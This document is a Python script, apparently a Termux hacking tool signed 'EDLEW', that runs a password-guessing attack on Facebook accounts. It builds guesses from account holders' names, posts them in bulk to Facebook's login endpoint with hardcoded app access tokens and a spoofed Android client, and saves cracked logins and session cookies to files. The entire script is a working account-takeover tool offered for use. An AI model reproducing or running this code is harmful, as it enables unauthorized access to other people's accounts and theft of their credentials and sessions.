import sys,requests,os
uuid = str(os.getlogin())+str(os.geteuid())
key = "|".join(uuid)
link = requests.get("https://pastebin.com/d0iikXpU").text
if key in link:
   pass
else:
   print("Your key",key)
   os.system("am start xx ")
   sys.exit()
   
#Coded by EDLEW . Modified by EDLEW
import sys,requests,os
import os,time,random,datetime,re,sys,string, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
import webbrowser
import time,datetime
os.system("نـورت اداه الدليو 🏴‍☠️🔥")
os.system('xdg-open https://www.facebook.com/WERSHAFANE/?ref=share')
try:
 import time,json,uuid,requests
except:
 os.system("pip install requests")
os.system("pkg install espeak")
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
os.system("espeak -a 300 \"Checking,Update,\"")
time.sleep(2)
#os.system('clear')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 1.0V...! ')
os.system("espeak -a 300 \"UPDATE VERSION 1.0V,\"")
time.sleep(2)
os.system("espeak -a 300 \"SUBSCRIBE,TELEGRAM,MY,CHANNEL,\"")
time.sleep(2)
#os.system('clear')
idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
F = '\033[2;32m'
R = '\x1b[1;91m'
Z1 = '\033[2;31m' 
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo=(f"""\033[1;91m⠀⠀⠀
⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣧⠀⢀⣠⣴⣾⠿⠟⠛⠛⠛⠛⠛⠛⠛⠻⠿⢿⣷⣦⣄⠀⠀⣾⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣧⢿⡿⠋⠀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⡀⠈⠛⢿⡿⣼⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠘⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⠏⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠇⠘⣿⡟⠙⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⢻⣿⠀⠸⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀
⠀⣰⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣧⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⣼⡟⠀⣾⣿⣿⣿⣷⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⡄⠀
⢀⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡄⠘⣿⣷⣤⣀⣀⡀⠀⣈⣩⣿⣿⣍⣁⠀⣀⣀⣀⣠⣼⣿⠇⢠⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⠀
⣸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⠀⣨⣿⣿⣿⣿⣿⣿⣿⡿⢀⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⡇
⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡇⠀⣿⣿⣿⡿⠛⠉⣿⣿⣧⣾⣷⣼⣿⣿⡟⠋⠉⢻⣿⡿⠀⣸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇
⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠈⠋⠉⠒⠀⠀⣿⣿⣿⣿⢿⡟⣻⣿⡇⠀⠀⠙⠉⣀⣴⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇
⢹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣾⣷⣄⡀⠀⣿⣿⣿⣿⢸⡇⣿⣿⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠘⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⢸⣿⢸⡇⣿⡿⠀⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠁
⠀⠙⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⡿⠀⢸⣿⢸⣿⢸⡇⣿⡇⠀⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⡿⣱⡆⠸⣿⢸⣿⣿⡇⣿⡇⠀⣞⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣄⣈⡈⠉⠈⢁⣉⣁⣴⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀
\033[1;91m⠀⠀⠀⠀⠀⠀

\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                       
 \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \033[0;92m
╠══[Github                  •  \033[0;92m•••••••••] \033[0;92m  ║ \033[0;92m
╠══[Facebook                 • AZ XR-ll      \033[0;92m 
╠══[Whatsapp             • +218*******   \033[0;92m
╠══[TOOLS                    • File ]     \033[0;92m 
╠══[VERSION                  • V 1.0 EDLEW-VIP
\033[0;92m╚\033[0;92m═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ \033[0;92m
  \033[0;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;91m√\033[1;91m]\033[1;92m EDLEW🏴‍☠️  TERMUX EDLEW 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●
⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──┈⊰᯽⊱  \033[0;92m
\033[1;91m[\033[1;91m√\033[1;91m] \033[0;92m EDLEW🏴‍☠️ TERMUX EDLEW 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●\033[1;
⊰᯽⊱┈──╌──────╌──╌╌────╌❊╌──╌────┈⊰᯽⊱""")
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""") 

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print(' \033[0;92m____EDLEW____')
def exit():
  sys.exit()

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1) } FILE")
    print(f"{oo(2) }exite")
    lin3()
    cp =input('|?| Enter : ')
    if cp=="1":file()
    if cp=="2":random()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter the file path : ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File not found ");time.sleep(1)
        main_menu() 
    method()
    exit()



"""
------Access Token------
Access Tokens. Change if necessary.

Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32
Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662
Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae

--------URL and Host--------
Graph : https://graph.facebook.com/auth/login/
B-Graph : https://b-graph.facebook.com/auth/login
"""


def method():
    clear()
    
    lp = input(f'{oo("?")}20Password ؟  :')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = """
Copy the codes 

--------------
firstlast
first last
firstfirst
first first
lastlast
last last
first123
first123456
00998877
0099887766
77889900
22446688
1133557799
091091091
qwertyuiopasdfghjkl 
qwertyuiopzxcvbnm
first2006
first2007
first2008
first1234556789
--------------"""
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear()
    print('\033[1;97m[+] ا: \033[1;32Account number in the file m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] 𝗗𝗼𝗻𝘁 𝗨𝘀𝗲 𝗔𝗶𝗿𝗽𝗹𝗮𝗻𝗲 𝗺𝗢𝗱𝗲 ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{W}EDLEW{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads="Dalvik/2.1.0 (Linux; U; Android 10; SM-N981B Build/QQ2A.591022.038) [FBAN/FB4A;FBAV/251.0.0.88.96;FBBV/849436448;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_FI;FBMF/Samsung;FBBD/Samsung;FBDV/SM-N981B;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]" #Put Your user Agent Here
              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
              header = {
    "Content-Type": "application/x-www-form-accencoded",
    "Host": "graph.facebook.com",
    "User-Agent": heads,
    "X-FB-Net-HNI": "45204",
    "X-FB-SIM-HNI": "45201",
    "X-FB-Connection-Type": "unknown",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "Accept-Encoding": "gzip, deflate",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "Connection": "Keep-Alive",
              }

              data={
    "adid": str(uuid.uuid4()),
    "format": "json",
    "device_id": str(uuid.uuid4()),
    "cpl": "true",
    "family_device_id": str(uuid.uuid4()),
    "credentials_type": "device_based_login_password",
    "error_detail_type": "button_with_disabled",
    "source": "device_based_login",
    "email": acc,
    "password": pswd,
    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "generate_session_cookies": "1",
    "meta_inf_fbmeta": "",
    "advertiser_id": str(uuid.uuid4()),
    "currently_logged_in_userid": "0",
    "locale": "en_US",
    "client_country_code": "US",
    "method": "auth.login",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
    "api_key": "882a8490361da98702bf97a021ddc14d",
              }

              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text
              if "session_key" in response:
                 oku.append(acc)
                 cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
                 print('\033[1;32m[OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 print(" [Cookie] ",cookie)
                 os.system('espeak -a 300 " EDLEW,  Ok,  id"')
                 open('/sdcard/EDLEW-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              elif "User must verify their account" in response:
                cpu.append(acc)
                print('\033[1;31m[CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)
                os.system('espeak -a 300 " CP, ID"')
                open('/sdcard/EDLEW-CP.txt','a').write(f'{acc}|{pswd}\n')
                break
              else:
                   continue   
     except Exception as e:
       time.sleep(10)
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    


main_menu()